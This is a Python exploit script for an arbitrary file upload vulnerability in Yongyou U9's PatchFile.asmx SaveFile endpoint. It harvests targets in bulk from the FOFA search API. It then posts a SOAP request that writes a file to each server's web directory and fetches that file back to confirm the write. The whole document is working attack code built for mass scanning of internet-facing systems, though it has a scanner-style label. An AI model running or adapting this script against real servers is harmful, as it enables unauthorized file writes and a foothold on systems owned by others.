#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import random
import json
import argparse
from tqdm import tqdm

def UA():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3100.0 Safari/537.3',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 EDGE/16.16299',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
    ]
    random_user_agent = random.choice(user_agents)
    headers = random_user_agent
    return headers

def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxxxxx&key=xxxxxxx&qbase64=dGl0bGU9PSIgICAgICAgIFU5LeeZu+W9lSAgICAi&size=9999" # title=="        U9-登录    "
        # 自行配置fofa邮箱和api key
    ]

    for url in urls:
        try:
            res = requests.get(url)
            respBody = res.text
            respBody = json.loads(respBody)
            if "results" in respBody:
                with open(filename, "a") as fp:
                    for ioc in respBody["results"]:
                        url = str(ioc[0])
                        if "http" not in url:
                            url = "http://" + str(url)
                        fp.write("{}\n".format(str(url)))
        except Exception as e:
            with open(filename + ".error", "a") as ferrorP:
                ferrorP.write(str(e) + "\n")

def Single_objective_testing(base_url): # 单目标检测
    path = "/CS/Office/AutoUpdates/PatchFile.asmx?op=SaveFile"
    header = {
        "User-Agent": UA(),
        "Connection": "close",
    }
    data = """<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SaveFile xmlns="http://tempuri.org/">
        <binData>MTIzNDU2</binData>
        <path>./</path>
        <fileName>1.txt</fileName>
        </SaveFile>
    </soap:Body>
    </soap:Envelope>"""

    full_url = base_url + path
    # print(full_url)
    try:
        rqg = requests.get(full_url, headers=header, verify=False, allow_redirects=False, timeout=2)
        if rqg.status_code == 200 and "SaveFile" in rqg.text:
            rqg2 = requests.post(full_url, headers=header, data=data.encode('utf-8'), verify=False, allow_redirects=False, timeout=2)
            if rqg2.status_code == 415:
                test_url = base_url + "/CS/Office/AutoUpdates/1.txt"
                rqg3 = requests.get(test_url, headers=header, verify=False, allow_redirects=False, timeout=2)
                if "123456" in rqg3.text:
                    msg = "{} 存在漏洞\n上传后的文件见：{}/CS/Office/AutoUpdates/1.txt".format(base_url, base_url)
                    return True, msg
                else:
                    msg = "{} 不存在漏洞".format(full_url)
                    return False, msg
            else:
                msg = "{} 不存在漏洞".format(full_url)
                return False, msg
        else:
            msg = "{} 不存在漏洞".format(full_url)
            return False, msg
    except requests.Timeout:
        msg = "{} 超时 ({} 秒)".format(full_url, 2)
        return False, msg
    except Exception as e:
        msg = "{} 报错: {}".format(full_url, str(e))
        return False, msg

def Multi_objective_testing(file): # 多目标检查
    with open(file, "r") as f:
        lines = f.readlines()
        for url in tqdm(lines, desc="Checking Progress", position=0, leave=False, ncols=80):
            url = url.strip()
            if "https" not in url:
                flag, msg = Single_objective_testing(url)
                if flag:
                    tqdm.write(str(msg))  # 使用 tqdm.write 输出，不打断 tqdm 进度条

def main():
    parser = argparse.ArgumentParser(description="### Yongyou U9 PatchFile.asmx arbitrary file upload. ###")
    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python Yongyou_U9_PatchFile.asmx_arbitrary_file_upload.py.py -u http://xxx.xxx.xxx")

    args = parser.parse_args()

    if args.target_collection:
        Target_collection("./url.txt")
    elif args.multi_objective_testing:
        Multi_objective_testing(args.multi_objective_testing)
    elif args.single_objective_testing:
        flag, msg = Single_objective_testing(args.single_objective_testing)
        if flag:
            print(str(msg))
        else:
            print(msg)
    else:
        print("No valid options provided. Use -h for help.")

if __name__ == "__main__":
    main()
